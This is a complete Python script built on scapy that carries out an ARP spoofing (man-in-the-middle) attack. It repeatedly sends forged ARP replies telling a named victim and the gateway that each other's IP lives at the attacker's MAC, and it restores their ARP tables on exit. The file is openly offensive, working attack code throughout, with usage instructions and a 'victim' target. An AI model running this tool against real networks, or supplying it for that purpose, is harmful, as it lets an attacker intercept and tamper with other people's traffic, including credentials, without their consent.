from scapy.layers.l2 import Ether, ARP, srp, sendp
import sys
import time

# We expect 3 total arguments: [script_name, arg1, arg2]
EXPECTED_ARGUMENT_COUNT = 3


def get_mac(ip):
    """
    Sends an ARP request to the specified IP address and returns its MAC address.
    """
    # Create an Ethernet frame with broadcast destination MAC
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    # Create an ARP request packet targeting the given IP
    arp_ip = ARP(pdst=ip)

    # Send and receive packets on layer 2 (Ethernet)
    # timeout=1: wait up to 1 second for a response
    # verbose=0: suppress scapy output
    answered, _ = srp(broadcast / arp_ip, timeout=1, verbose=0)

    if not answered:
        # Raise an exception if no host responds
        raise Exception(f"Host with IP {ip} did not respond to ARP request.")

    # Extract the hardware source (hwsrc) MAC address from the received packet (answered[0][1])
    mac = answered[0][1].hwsrc
    return mac


def restore(victim_ip, gateway_ip, victim_mac_real, gateway_mac_real):
    """
    Restores the ARP tables of the victim and gateway to their correct state.
    Sends packets multiple times to ensure targets update their cache.
    """
    # Restore Victim: tell victim the truth about the gateway's MAC
    victim_restore_packet = ARP(op=2,
                                pdst=victim_ip,
                                psrc=gateway_ip,
                                hwdst=victim_mac_real,
                                hwsrc=gateway_mac_real)

    # Restore Gateway: tell gateway the truth about the victim's MAC
    gateway_restore_packet = ARP(op=2,
                                 pdst=gateway_ip,
                                 psrc=victim_ip,
                                 hwdst=gateway_mac_real,
                                 hwsrc=victim_mac_real)

    # Send packets multiple times to ensure the targets update their cache
    sendp(victim_restore_packet, count=7, verbose=False)
    sendp(gateway_restore_packet, count=7, verbose=False)

    print("[+] ARP tables successfully restored. Script terminated.")


def spoof(victim_ip, spoof_ip):
    """
    Sends a malicious ARP response packet to the victim.
    """
    # Note: get_mac is called inside run() once, and the real MACs are passed to restore.
    # Calling get_mac here on every loop is inefficient but ensures we always have the target's MAC.
    # However, since we are aiming for robust code, we'll keep the initial MAC check in run().

    # In a typical spoof, you use a static MAC for the victim's machine,
    # but here we use the MAC of the machine currently running the script.

    # Since we need the victim's MAC every time, we call get_mac:
    try:
        victim_mac = get_mac(victim_ip)
    except Exception as e:
        # This should ideally not happen in the loop if it worked initially
        print(f"Error while fetching MAC for {victim_ip}: {e}")
        return

    # op=2: ARP response (is-at)
    # hwdst: The MAC of the target receiving this packet (the victim)
    # pdst: The IP of the target receiving this packet (the victim)
    # psrc: The IP we are claiming to be (either the gateway or the victim)
    packet = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=spoof_ip)

    # Send the packet on the 'eth0' interface (hardcoded in user's original query)
    sendp(packet, iface="eth0", verbose=False)
    print(f"[+] Sent to {victim_ip}: claiming {spoof_ip} is at our MAC address.")


def run(victim_ip, gateway_ip):
    """
    The main spoofing loop that continuously sends ARP packets.
    """
    print("\nStarting ARP Spoofing. Press Ctrl+C to stop...")
    print("------------------------------------------")

    try:
        # Get and store the real MAC addresses before starting the loop
        victim_mac_real = get_mac(victim_ip)
        gateway_mac_real = get_mac(gateway_ip)
        print(f"Target (Victim IP): {victim_ip} (MAC: {victim_mac_real})")
        print(f"Gateway IP: {gateway_ip} (MAC: {gateway_mac_real})")
    except Exception as e:
        print(f"\n[!] Script stopped due to initial MAC lookup failure: {e}")
        return

    while True:
        try:
            # Tell the victim that we are the gateway
            spoof(victim_ip, gateway_ip)
            # Tell the gateway that we are the victim
            spoof(gateway_ip, victim_ip)

            time.sleep(2)  # Wait 2 seconds before sending the next pair of packets

        except KeyboardInterrupt:
            print("\n[!] Ctrl+C detected. Restoring ARP tables...")
            # Restore the ARP tables using the real MACs we stored
            restore(victim_ip, gateway_ip, victim_mac_real, gateway_mac_real)
            break
        except Exception as e:
            print(f"\n[!] Critical error: {e}. Attempting to restore ARP tables.")
            restore(victim_ip, gateway_ip, victim_mac_real, gateway_mac_real)
            break


def main():
    if len(sys.argv) != EXPECTED_ARGUMENT_COUNT:
        print("Usage: sudo python3 arpspoof.py <Target IP> <Gateway IP>")
        print(f"Error: Expected {EXPECTED_ARGUMENT_COUNT - 1} arguments, but received {len(sys.argv) - 1}.")
        sys.exit(1)

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    print("--- ARP Spoofing Tool ---")
    print("NOTE: Requires 'scapy' (pip install scapy) and root privileges (sudo).")

    run(victim_ip, gateway_ip)


if __name__ == "__main__":
    main()
